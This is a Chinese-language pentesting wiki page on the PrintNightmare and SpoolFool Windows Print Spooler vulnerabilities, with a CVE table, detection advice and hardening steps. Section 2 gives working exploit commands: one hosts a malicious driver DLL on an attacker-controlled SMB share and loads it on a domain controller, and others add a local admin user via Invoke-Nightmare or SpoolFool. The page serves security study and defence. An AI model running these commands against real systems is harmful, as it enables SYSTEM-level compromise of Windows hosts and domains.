# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare 是一个集合名称，指的是 Windows **Print Spooler** 服务中的一系列漏洞，这些漏洞允许 **以 SYSTEM 身份执行任意代码**，并且当打印机后台处理程序可以通过 RPC 访问时，**在域控制器和文件服务器上进行远程代码执行 (RCE)**。最广泛利用的 CVE 是 **CVE-2021-1675**（最初被归类为 LPE）和 **CVE-2021-34527**（完全 RCE）。后续问题如 **CVE-2021-34481 (“Point & Print”)** 和 **CVE-2022-21999 (“SpoolFool”)** 证明攻击面仍远未关闭。

---

## 1. 易受攻击的组件与 CVE

| 年份 | CVE | 简称 | 原语 | 备注 |
|------|-----|------|------|------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|在 2021 年 6 月的 CU 中修补，但被 CVE-2021-34527 绕过|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|AddPrinterDriverEx 允许经过身份验证的用户从远程共享加载驱动程序 DLL|
|2021|CVE-2021-34481|“Point & Print”|LPE|非管理员用户安装未签名驱动程序|
|2022|CVE-2022-21999|“SpoolFool”|LPE|任意目录创建 → DLL 植入 – 在 2021 年补丁后有效|

它们都利用了 **MS-RPRN / MS-PAR RPC 方法**（`RpcAddPrinterDriver`，`RpcAddPrinterDriverEx`，`RpcAsyncAddPrinterDriver`）或 **Point & Print** 内部的信任关系。

## 2. 利用技术

### 2.1 远程域控制器妥协 (CVE-2021-34527)

经过身份验证但 **非特权** 的域用户可以通过以下方式在远程打印后台处理程序（通常是 DC）上以 **NT AUTHORITY\SYSTEM** 身份运行任意 DLL：
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
流行的 PoC 包括 **CVE-2021-1675.py** (Python/Impacket)、**SharpPrintNightmare.exe** (C#) 和 Benjamin Delpy 的 `misc::printnightmare / lsa::addsid` 模块在 **mimikatz** 中。

### 2.2 本地权限提升（任何支持的 Windows，2021-2024）

相同的 API 可以 **本地** 调用，从 `C:\Windows\System32\spool\drivers\x64\3\` 加载驱动程序并获得 SYSTEM 权限：
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 SpoolFool (CVE-2022-21999) – 绕过 2021 修复

Microsoft 的 2021 补丁阻止了远程驱动程序加载，但**并未加强目录权限**。SpoolFool 利用 `SpoolDirectory` 参数在 `C:\Windows\System32\spool\drivers\` 下创建任意目录，放置一个有效负载 DLL，并强制打印机后台处理程序加载它：
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> 漏洞在完全修补的 Windows 7 → Windows 11 和 Server 2012R2 → 2022 上有效，更新截止到 2022 年 2 月

---

## 3. 检测与狩猎

* **事件日志** – 启用 *Microsoft-Windows-PrintService/Operational* 和 *Admin* 通道，监视 **事件 ID 808** “打印后台处理程序未能加载插件模块” 或 **RpcAddPrinterDriverEx** 消息。
* **Sysmon** – `事件 ID 7` (图像加载) 或 `11/23` (文件写入/删除) 在 `C:\Windows\System32\spool\drivers\*` 中，当父进程为 **spoolsv.exe** 时。
* **进程血统** – 每当 **spoolsv.exe** 生成 `cmd.exe`、`rundll32.exe`、PowerShell 或任何未签名的二进制文件时发出警报。

## 4. 缓解与加固

1. **打补丁！** – 在每个安装了打印后台处理程序服务的 Windows 主机上应用最新的累积更新。
2. **在不需要的地方禁用后台处理程序**，特别是在域控制器上：
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **阻止远程连接**，同时仍允许本地打印 – 组策略：`计算机配置 → 管理模板 → 打印机 → 允许打印后台处理程序接受客户端连接 = 禁用`。
4. **限制点和打印**，使只有管理员可以添加驱动程序，通过设置注册表值：
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
详细指导见 Microsoft KB5005652

---

## 5. 相关研究 / 工具

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) 模块
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* SpoolFool 漏洞及其分析
* 0patch 微补丁用于 SpoolFool 和其他后台处理程序漏洞

---

**更多阅读（外部）：** 查看 2024 年的博客文章 – [理解 PrintNightmare 漏洞](https://www.hackingarticles.in/understanding-printnightmare-vulnerability/)

## 参考文献

* Microsoft – *KB5005652: 管理新的点和打印默认驱动程序安装行为*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
{{#include ../../banners/hacktricks-training.md}}
